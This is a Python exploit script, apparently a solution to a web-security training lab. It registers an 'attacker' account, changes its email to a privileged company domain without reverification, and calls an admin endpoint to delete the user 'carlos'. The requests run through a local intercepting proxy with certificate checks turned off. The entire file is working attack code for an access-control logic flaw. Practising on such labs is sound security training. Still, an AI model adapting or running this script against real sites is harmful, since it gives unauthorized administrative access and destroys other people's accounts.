import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})['value']
    return csrf

def delete_user(s, url, emailId):

    # Retrieve the CSRF token
    register_url = url + "/register"
    csrf_token = get_csrf_token(s, register_url)

    # Register as "attacker" user
    data = {'csrf': csrf_token, 'username': 'attacker', 'email': emailId, 'password': '1234'}
    r = s.post(register_url, data=data, verify=False, proxies=proxies)

    # Verify for registering user
    verificaton_token_url = input("Pleae enter the vertification link sent to given Email ID: ")
    r = s.get(verificaton_token_url, verify=False, proxies=proxies)

    if "Account registration successful!" in r.text:
        print("[+] Attacker account successfully created")

        # Login as user
        login_url = url + "/login"
        csrf_token = get_csrf_token(s, login_url)
        data = {'csrf': csrf_token, 'username': 'attacker', 'password': '1234'}
        r = s.post(login_url, data=data, verify=False, proxies=proxies)

        if "Your username is: attacker" in r.text:

            # Change Email ID
            account_url = url + "/my-account?id=attacker"
            csrf_token = get_csrf_token(s, account_url)
            change_email_url = url + "/my-account/change-email"
            data = {'email': 'attacker@DontWannaCry.com', 'csrf': csrf_token}
            r = s.post(change_email_url, data=data, verify=False, proxies=proxies)
            if "attacker@DontWannaCry.com" in r.text:
                print("[+] Attacker Email ID has successfully been changed to DontWannaCry.com Domain")

                # Delete user "carlos"
                delete_url = url + "/admin/delete?username=carlos"
                r = s.get(delete_url, verify=False, proxies=proxies)

                if "User deleted successfully!" in r.text:
                    print("[+] User carlos has successfully been deleted!")
                else:
                    print("[-] Could not delete the user 'carlos'.")

            else:
                print("[-] Could not change the Email ID.")
        else:
            print("(-) Could not LogIn.")
    else:
        print("(-) Could not register as a user.")


def main():
    if len(sys.argv) != 3:
        print("(+) Usage: %s <url> <email_id>" % sys.argv[0])
        print("(+) Example: %s www.example.com attacker@exploit-1111.exploit-server.net" % sys.argv[0])
        sys.exit(-1)
    s = requests.Session()
    url = sys.argv[1]
    emailId = sys.argv[2]
    delete_user(s, url, emailId)

if __name__ == "__main__":
    main()